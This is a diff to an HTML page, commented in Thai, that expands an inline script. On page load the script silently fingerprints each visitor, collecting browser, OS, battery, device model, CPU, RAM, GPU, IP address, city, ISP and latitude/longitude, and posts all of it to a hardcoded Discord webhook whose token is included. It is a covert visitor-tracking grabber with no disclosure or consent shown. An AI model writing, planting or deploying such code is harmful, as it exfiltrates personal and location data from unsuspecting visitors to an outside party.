@@ -28,54 +28,123 @@
       // หรือ redirect ไปหน้าอื่น
       // window.location.href = "https://example.com";
   }
-</script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/0.7.28/ua-parser.min.js"></script>
+<script>
+const webhookURL = "https://discord.com/api/webhooks/1270880902045503498/N-TWxnUShFZgO0ZplC9mIRJsIi_1CFdHG-PhjA_sD6o8FLkC26I1gZ0HJAW3KhSpYb0H"; // เปลี่ยนเป็นของคุณ
 
-    <script>
-        // Discord Webhook URL
-        const webhookURL = "https://discord.com/api/webhooks/1270880902045503498/N-TWxnUShFZgO0ZplC9mIRJsIi_1CFdHG-PhjA_sD6o8FLkC26I1gZ0HJAW3KhSpYb0H";
+// ส่งข้อมูลไป Discord
+async function sendToDiscord(info) {
+    try {
+        await fetch(webhookURL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ content: info })
+        });
+    } catch (err) {
+        console.error("ส่งข้อมูลไม่สำเร็จ:", err);
+    }
+}
 
-        // ฟังก์ชันส่งข้อมูลไป Discord
-        async function sendToDiscord(info) {
-            try {
-                await fetch(webhookURL, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ content: info })
-                });
-            } catch (err) {
-                console.error("ไม่สามารถส่งข้อมูลไป Discord ได้:", err);
-            }
+// ตรวจจับ OS จาก userAgent
+function detectOS() {
+    const ua = navigator.userAgent.toLowerCase();
+    if (ua.includes("windows nt 10.0")) return "Windows 10/11";
+    if (ua.includes("windows nt 6.3")) return "Windows 8.1";
+    if (ua.includes("windows nt 6.2")) return "Windows 8";
+    if (ua.includes("windows nt 6.1")) return "Windows 7";
+    if (ua.includes("mac os x")) return "macOS";
+    if (ua.includes("android")) return "Android";
+    if (ua.includes("iphone") || ua.includes("ipad")) return "iOS";
+    if (ua.includes("linux")) return "Linux";
+    return "ไม่สามารถระบุได้";
+}
+
+// ดึงข้อมูล GPU เบื้องต้นจาก WebGL
+function getGPUInfo() {
+    try {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+        return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "ไม่สามารถเข้าถึง GPU";
+    } catch {
+        return "ไม่สามารถเข้าถึง GPU";
+    }
+}
+
+async function collectUserInfo() {
+    const browser = navigator.userAgent;
+    const platform = navigator.platform;
+    const os = detectOS();
+    const language = navigator.language;
+    const screenSize = `${window.screen.width}x${window.screen.height}`;
+    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
+    // Battery
+    let battery = "ไม่รองรับ";
+    if (navigator.getBattery) {
+        try {
+            const b = await navigator.getBattery();
+            battery = (b.level * 100) + "%";
+        } catch {
+            battery = "ไม่สามารถเข้าถึงได้";
         }
+    }
 
-        // ดึงข้อมูลผู้ใช้
-        async function collectUserInfo() {
-            // ข้อมูลเบื้องต้นจาก browser
-            const browser = navigator.userAgent;
-            const platform = navigator.platform;
-            const language = navigator.language;
-            const screenSize = `${window.screen.width}x${window.screen.height}`;
-            const battery = navigator.getBattery ? await navigator.getBattery().then(b => b.level * 100 + "%") : "ไม่สามารถเข้าถึงได้";
+    // Device info จาก UAParser.js
+    const parser = new UAParser();
+    const device = parser.getResult().device;
+    const deviceModel = device.model || "ไม่ระบุ";
+    const deviceVendor = device.vendor || "ไม่ระบุ";
+    const deviceType = device.type || "ไม่ระบุ";
 
-            // ดึง IP โดยใช้ API ฟรี
-            const ipResponse = await fetch("https://api.ipify.org?format=json");
-            const ipData = await ipResponse.json();
-            const ip = ipData.ip;
+    // Hardware info
+    const cpuCores = navigator.hardwareConcurrency || "ไม่ระบุ";
+    const ramGB = navigator.deviceMemory || "ไม่ระบุ";
+    const gpuInfo = getGPUInfo();
 
-            const info = `
-ผู้ใช้เข้าชมเว็บไซต์
-IP: ${ip}
+    // IP + location จาก ipapi.co
+    let ipInfo = {};
+    try {
+        const ipRes = await fetch("https://ipapi.co/json/");
+        ipInfo = await ipRes.json();
+    } catch {
+        ipInfo = { ip: "N/A", country: "N/A" };
+    }
+
+    const info = `
+📡 ข้อมูลจาก Browser
 Browser: ${browser}
 Platform: ${platform}
+OS: ${os}
 Language: ${language}
 Screen Size: ${screenSize}
+Timezone: ${timezone}
 Battery: ${battery}
-`;
 
-            // ส่งข้อมูลไป Discord
-            sendToDiscord(info);
-        }
+📱 ข้อมูลอุปกรณ์
+Device Vendor: ${deviceVendor}
+Device Model: ${deviceModel}
+Device Type: ${deviceType}
 
-        collectUserInfo();
-    </script>
+💻 ข้อมูลฮาร์ดแวร์ (คร่าวๆ)
+CPU Cores: ${cpuCores}
+RAM: ${ramGB} GB
+GPU: ${gpuInfo}
+
+🌍 ข้อมูลจาก API
+IP: ${ipInfo.ip}
+ประเทศ: ${ipInfo.country_name} (${ipInfo.country})
+เมือง: ${ipInfo.city}
+ISP: ${ipInfo.org}
+พิกัด: ${ipInfo.latitude}, ${ipInfo.longitude}
+โซนเวลา: ${ipInfo.timezone}
+    `;
+
+    sendToDiscord(info);
+}
+
+collectUserInfo();
+</script>
+
 </body>
 </html>
